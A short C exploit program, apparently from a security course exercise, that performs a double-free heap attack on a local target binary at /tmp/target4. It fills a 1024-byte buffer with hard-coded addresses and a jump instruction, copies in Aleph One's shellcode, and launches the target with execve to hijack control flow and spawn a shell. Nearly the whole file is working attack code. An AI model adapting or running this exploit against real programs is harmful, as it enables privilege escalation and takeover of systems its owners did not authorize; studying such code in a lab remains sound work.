#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define EGG_SIZE 1024

/* 
 * Main idea of exploit:
 *     This double free exploit. 
 */

int main(void)
{
  char *args[3];
  char *env[1];
  long retAddr, retLoc, jumpInstruction;
  char egg[EGG_SIZE]; /* string containing exploit code */
  int i;

  retAddr = 0x08049C68; // address of buff
  jumpInstruction = 0xFFFF06EB; // jump instr
  retLoc = 0xBFFFFA3C; // addr of eip for foo

  memset (egg, 1, EGG_SIZE);
  memcpy (&egg[504], &retAddr, 4);
  memcpy (&egg[508], &retLoc, 4);
  memcpy (egg, &jumpInstruction, 2);


  /* Then fill the first bytes of the exploit string with
     Aleph One's shellcode */
  memcpy (egg + 8, shellcode, strlen (shellcode));

  egg[EGG_SIZE - 1] = 0; /* null terminate exploit string for safety */
  
  args[0] = TARGET; args[1] = egg; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve (TARGET, args, env))
    fprintf (stderr, "execve failed.\n");

  return 0;
}
